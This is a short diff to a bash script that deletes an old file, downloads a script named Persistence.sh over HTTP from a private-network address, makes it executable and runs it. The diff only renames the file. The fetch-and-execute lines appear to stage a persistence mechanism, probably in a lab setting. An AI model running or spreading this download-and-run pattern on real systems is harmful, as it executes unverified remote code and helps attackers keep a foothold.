@@ -1,9 +1,9 @@
 #! /bin/bash
 
-[ -f Persist.sh ] && rm Persist.sh
+[ -f Persistence.sh ] && rm Persistence.sh
 
-wget http://192.168.211.129:8000/Downloads/Scripts/Persist.sh
+wget http://192.168.211.129:8000/Downloads/Scripts/Persistence.sh
 
-chmod +x ./Persist.sh 
+chmod +x ./Persistence.sh 
 
-./Persist.sh
+./Persistence.sh
